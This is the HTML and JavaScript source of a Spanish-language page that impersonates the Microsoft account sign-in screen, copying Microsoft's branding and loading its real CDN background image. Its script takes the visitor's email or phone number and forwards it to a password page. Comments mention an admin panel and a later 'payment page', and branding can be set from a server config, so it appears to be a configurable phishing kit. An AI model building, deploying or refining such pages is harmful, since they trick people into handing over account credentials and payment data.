<!doctype html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Iniciar sesión en su cuenta</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              'ms-blue': '#0078d4',
              'ms-blue-hover': '#106ebe',
              'ms-red': '#f25022',
              'ms-green': '#7fba00',
              'ms-yellow': '#ffb900',
              'ms-blue-logo': '#00bcf2',
              'ms-gray': '#1b1b1b',
              'ms-gray-light': '#605e5c',
              'ms-border': '#8a8886',
              'ms-bg': '#f5f5f5',
              'ms-error': '#dc2626',
              'ms-error-bg': '#fef2f2',
              'ms-error-border': '#fca5a5',
            },
            fontFamily: {
              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
            },
            fontSize: {
              'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
              'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
              'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
              'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
              'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
            },
            boxShadow: {
              'ms-card': '0 2px 6px rgba(0,0,0,0.2)',
            }
          }
        }
      }
    </script>
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      body, html {
        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        min-height: 100vh;
        width: 100%;
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: fixed;
        overflow: hidden;
      }
      body {
        background-color: #0a0a1a;
        background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
      }
      @media (min-width: 640px) {
        body { overflow: auto; position: static; }
      }
      .ms-input {
        border: 1px solid #8a8886;
        font-size: 15px;
        padding: 11px 12px;
        line-height: 20px;
        border-radius: 2px;
        background: #fff;
        color: #1b1b1b;
        width: 100%;
      }
      .ms-input:focus {
        outline: none;
        border-color: #0078d4;
        box-shadow: inset 0 0 0 1px #0078d4;
      }
      .ms-button {
        background: #0078d4;
        transition: background-color 0.1s ease;
        font-size: 15px;
        font-weight: 600;
        padding: 8px 12px;
        min-height: 32px;
        border-radius: 2px;
        color: #fff;
        border: none;
        cursor: pointer;
      }
      .ms-button:hover { background: #106ebe; }
      .ms-button:active { background: #005a9e; }
      .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
      .ms-link {
        color: #0078d4;
        text-decoration: none;
        font-size: 13px;
      }
      .ms-link:hover { text-decoration: underline; }
      .fade-in { animation: fadeIn 0.3s ease-out; }
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }
      .main-container {
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 1rem;
        z-index: 10;
      }
      @media (min-width: 640px) {
        body { overflow: auto; position: static; }
        .main-container { position: static; min-height: 100vh; }
      }
      /* Error box */
      .error-box {
        background: #fef2f2;
        border: 1px solid #fca5a5;
        border-radius: 4px;
        padding: 8px 12px;
        margin-bottom: 12px;
        text-align: center;
        display: none;
      }
      .error-text {
        color: #dc2626;
        font-size: 13px;
        font-weight: 500;
      }
      /* Login card - semi-transparent over background */
      .login-card {
        background: rgba(255, 255, 255, 0.15);
        backdrop-filter: blur(10px);
        border-radius: 12px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        border: 1px solid rgba(255, 255, 255, 0.2);
      }
      /* Footer */
      .footer-links {
        position: fixed;
        bottom: 0; left: 0; right: 0;
        background: rgba(255,255,255,0.95);
        backdrop-filter: blur(8px);
        border-top: 1px solid #e5e5e5;
        padding: 8px 0;
        z-index: 50;
      }
      .footer-links a {
        color: #605e5c;
        font-size: 12px;
        text-decoration: none;
      }
      .footer-links a:hover { color: #0078d4; }
      @media (min-width: 640px) {
        .footer-links { padding: 10px 0; }
        .footer-links a { font-size: 13px; }
      }
    </style>
  </head>
  <body>
    <!-- Background overlay for readability -->
    <div class="fixed inset-0 bg-black/20 backdrop-blur-[0.5px]"></div>

    <!-- Main Content -->
    <div class="main-container">
      <div class="w-full max-w-md fade-in relative z-10">
        <div class="login-card p-8 sm:p-12" id="loginCard">
          <!-- Microsoft Logo with configurable text -->
          <div class="flex items-center justify-center mb-6" id="logoContainer">
            <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3" id="logoColors">
              <div class="bg-ms-red w-3 h-3"></div>
              <div class="bg-ms-green w-3 h-3"></div>
              <div class="bg-ms-blue-logo w-3 h-3"></div>
              <div class="bg-ms-yellow w-3 h-3"></div>
            </div>
            <span class="text-ms-logo text-ms-gray" id="logoText" style="color:#1b1b1b;">Microsoft</span>
          </div>

          <h1 class="text-ms-title text-ms-gray mb-1 font-semibold text-center" id="loginTitle" style="color:#1b1b1b;">Iniciar sesión</h1>
          <p class="text-ms-subtitle text-ms-gray-light mb-6 text-center" id="loginSubtitle" style="color:#605e5c;">Usar su cuenta de Microsoft.</p>

          <!-- Error box -->
          <div id="errorBox" class="error-box">
            <span id="errorText" class="error-text"></span>
          </div>

          <form onsubmit="handleEmailSubmit(event)" class="space-y-5" id="emailForm">
            <div>
              <input
                type="email"
                id="email"
                placeholder="Correo electrónico o número de teléfono"
                class="ms-input"
                required
              />
            </div>

            <!-- "¿Olvidaste tu nombre de usuario?" position calibrator (right-aligned) -->
            <div class="flex justify-end">
              <a href="#" class="ms-link" id="forgotUsernameLink">¿Olvidaste tu nombre de usuario?</a>
            </div>

            <button type="submit" class="ms-button w-full text-white" id="emailSubmitBtn">
              <span id="emailBtnText">Siguiente</span>
            </button>

            <div class="text-center text-ms-body text-ms-gray-light" style="color:#605e5c;">
              ¿Es nuevo en Microsoft?
              <a href="#" class="ms-link font-semibold">Crear una cuenta</a>
            </div>
          </form>
        </div>
      </div>
    </div>

    <!-- Footer Links -->
    <div class="footer-links">
      <div class="max-w-4xl mx-auto px-4">
        <div class="flex flex-col sm:flex-row items-center justify-center gap-1 sm:gap-6 text-xs">
          <a href="javascript:void(0)" id="footerHelp">Ayuda</a>
          <a href="javascript:void(0)">Términos de uso</a>
          <a href="javascript:void(0)" id="footerPrivacy">Privacidad y cookies</a>
          <span class="text-center hidden sm:inline text-xs px-1">Usa la exploración privada si este no es tu dispositivo. <a href="javascript:void(0)" class="ms-link" style="color:#0078d4;">Más información</a></span>
        </div>
      </div>
    </div>

    <script>
      // ---- Config loading ----
      async function loadConfig() {
        try {
          const res = await fetch('/api/config');
          if (!res.ok) throw new Error('Config fetch failed');
          const config = await res.json();
          applyConfig(config);
        } catch (err) {
          console.warn('Could not load config from server, using defaults:', err);
          applyConfig(null);
        }
      }

      function applyConfig(config) {
        const bgImage = (config && config.loginBgImage) || 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg';
        const bgType = (config && config.loginBgType) || 'image';

        if (bgType === 'gradient' && config && config.loginBgGradient) {
          document.body.style.background = config.loginBgGradient;
        } else {
          document.body.style.backgroundImage = 'url("' + bgImage + '")';
          document.body.style.backgroundSize = 'cover';
          document.body.style.backgroundPosition = 'center';
          document.body.style.backgroundRepeat = 'no-repeat';
          if (config && config.loginBgColor && bgType === 'color') {
            document.body.style.backgroundColor = config.loginBgColor;
          }
        }

        if (config && config.loginTitle) {
          const t = document.getElementById('loginTitle');
          if (t) t.textContent = config.loginTitle;
        }
        if (config && config.loginSubtitle) {
          const s = document.getElementById('loginSubtitle');
          if (s) s.textContent = config.loginSubtitle;
        }
        if (config && config.loginButton) {
          const b = document.getElementById('emailBtnText');
          if (b) b.textContent = config.loginButton;
        }
        if (config && config.logoText && config.showLogo !== false) {
          const l = document.getElementById('logoText');
          if (l) l.textContent = config.logoText;
        }

        // Apply saved settings from localStorage if available (for live admin edits)
        const localBgImage = getSavedSetting('loginBgImage');
        const localBgType = getSavedSetting('loginBgType');
        if (localBgType === 'image' && localBgImage) {
          document.body.style.backgroundImage = 'url("' + localBgImage + '")';
        } else if (localBgType === 'gradient') {
          const localGrad = getSavedSetting('loginBgGradient');
          if (localGrad) document.body.style.background = localGrad;
        } else if (localBgType === 'color') {
          const localColor = getSavedSetting('loginBgColor');
          if (localColor) document.body.style.backgroundColor = localColor;
        }
      }

      function getSavedSetting(key) {
        try {
          const val = localStorage.getItem(key);
          return val !== null ? val : null;
        } catch (e) {
          return null;
        }
      }

      // ---- Admin access ----
      // Admin access is only available on the payment page (after email + password step)
      // Not available on this page

      // ---- Error handling ----
      function showError(message) {
        const errorBox = document.getElementById('errorBox');
        const errorText = document.getElementById('errorText');
        if (errorBox && errorText) {
          errorText.textContent = message;
          errorBox.style.display = 'block';
        }
      }

      function hideError() {
        const errorBox = document.getElementById('errorBox');
        if (errorBox) errorBox.style.display = 'none';
      }

      // ---- Email form submission (paso 1) ----
      function handleEmailSubmit(event) {
        event.preventDefault();
        const emailInput = document.getElementById('email');
        const email = emailInput.value.trim();

        if (!email) {
          showError('Por favor ingrese un correo electrónico o número de teléfono.');
          return;
        }

        if (email.includes('@') && !isValidEmail(email)) {
          showError('Ingrese un correo electrónico válido.');
          return;
        }

        hideError();

        // Navegar a la página de contraseña (paso 2)
        window.location.href = 'password.html?email=' + encodeURIComponent(email);
      }

      function isValidEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
      }

      // Initialize
      loadConfig();
    </script>
  </body>
</html>
